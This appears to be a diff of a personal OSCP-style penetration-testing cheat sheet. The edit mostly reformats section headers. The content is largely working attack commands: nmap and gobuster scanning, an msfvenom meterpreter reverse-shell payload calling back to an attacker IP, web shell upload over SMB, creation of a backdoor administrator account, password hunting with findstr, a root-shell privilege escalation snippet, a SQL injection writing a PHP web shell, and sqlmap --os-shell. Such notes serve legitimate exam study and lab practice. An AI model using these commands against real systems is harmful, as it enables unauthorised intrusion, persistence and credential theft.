@@ -7,7 +7,10 @@
 ----------------------------------------------------
 ----------------------------------------------------
 
-------------- Compilation Tools-------------------
+
+----------------------------------------------------
+------------- Compilation Tools---------------------
+----------------------------------------------------
 
 Cross-Compilation exploits
 
@@ -17,14 +20,17 @@ i686-w64-mingw32-gcc hello.c -o hello32.exe      # 32-bit
 x86_64-w64-mingw32-gcc hello.c -o hello64.exe    # 64-bit
 
 ----------------------------------------------------
-----------Scanning / Dir buster -------
+----------Scanning / Dir buster --------------------
+----------------------------------------------------
 
 nmap -sU -sV -A
 nmap -p- -T4 -A 10.11.1.13
 gobuster -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.23.43
 ( wpscan - wordpress ) wp-config.php
 
----------- webshell-------
+----------------------------------------------------
+---------- webshells--------------------------------
+----------------------------------------------------
 
 usr/share/webshell/php/php-reverse-shell
 
@@ -36,8 +42,9 @@ smbclient //WINPOWER/files -l 192.168.0.1 -c "put shell.aspx shell.aspx"
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.19.1 LPORT=443 -f aspx > shell.aspx
 
-
---------- Post Explotation------
+----------------------------------------------------
+--------- Post Explotation--------------------------
+----------------------------------------------------
 
 net user /add oscp 123456
 net localgroup administrators oscp/add
@@ -49,7 +56,9 @@ find ./ | grep local.txt
 
 findstr /si password *.xml *.ini *.txt *.config 2>nul
 
-------- PE --------
+----------------------------------------------------
+------- Priviliege Escalation ----------------------
+----------------------------------------------------
 
 sudo -l
 crontab -l
@@ -68,9 +77,9 @@ system("/bin/bash");
 }
 
 
---------- injection ---
-
-
+----------------------------------------------------
+------- Injection ----------------------------------
+----------------------------------------------------
 
 python -m SimpleHTTPServer 80
 
@@ -79,17 +88,14 @@ mysql -u DBUSER -h DBSERVERNAME_OR_IP -p
 http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo
 shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
 
-
-
 lsof -i:80
 kill $(lsof -t -i:80)
 
 sqlmap -r request-file --random-agent --risk 3 --level 5 --dbms=mysql -p id --os-shell
 
-
----------------------------------------
------------ usefull links --------------
----------------------------------------
+----------------------------------------------------
+------- Usefull Links ------------------------------
+----------------------------------------------------
 
 -------- Priviliege Escalation ----------
 
@@ -101,7 +107,7 @@ https://payatu.com/guide-linux-privilege-escalation
 
 https://github.com/Ignitetechnologies/Privilege-Escalation/blob/master/README.md
 
-----------------------Other  --------------------
+---------------------- Other  --------------------
 
 https://github.com/pythonmaster41/Go-For-OSCP
 
